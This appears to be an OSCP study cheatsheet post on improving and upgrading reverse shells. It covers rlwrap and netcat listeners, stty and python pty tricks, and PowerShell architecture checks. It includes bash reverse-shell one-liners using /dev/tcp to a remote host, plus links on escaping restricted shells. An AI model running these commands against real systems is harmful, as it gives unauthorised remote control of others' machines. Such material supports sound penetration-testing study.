---
title: Upgrading and Improving Shells
author: sKyW1per 
category: "OSCP"
date: "2021-03-08 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---


###### Tricks to improve a crappy shell
```
rlwrap
$ rlwrap -r nc -nvlp 443

Turning terminal echo off:
1
Ctrl + Z in the nc instance to move the shell to the background;
2
$ stty raw echo; fg
For also getting the ability to clear the screen:
3
In the nc shell:
$ export term=XTERM

```

###### Upgrading Shells
```
Upgrade sh to bash using python (2 or 3)
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ python -c 'import pty; pty.spawn("/bin/bash")'

Correcting the $PATH variable for sh / bash
$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:/bin

Upgrading from rbash:
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/

Start bash instance:
$ /bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1
$ /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1'

```

###### Check Architecture of a PowerShell connection

~|32 bit folder|64 bit folder|
---|---|---
32-bit session | C:\Windows\system32\ | C:\Windows\sysNative
64-bit session | C:\Windows\sysWOW64\ | C:\Windows\system32

```
Check architecture of the host
$ [system.environment]::Is64BitOperatingSystem

Check architecture of powershell environment:
$ [Environment]::Is64BitProcess

alternative to check arch in ps environment:
$ [IntPtr]::Size
The value of this property is 4 in a 32-bit process, and 8 in a 64-bit process.

For example: If you get a shell trough a webserver running in a 32bit process but the host is 64bit, powershell will by default open a 32bit process.
This can be solved by specifically calling powershell with the following path:
C:\Windows\sysNative\WindowsPowerShell\v1.0\powershell.exe

More info:
https://ss64.com/nt/syntax-64bit.html
```
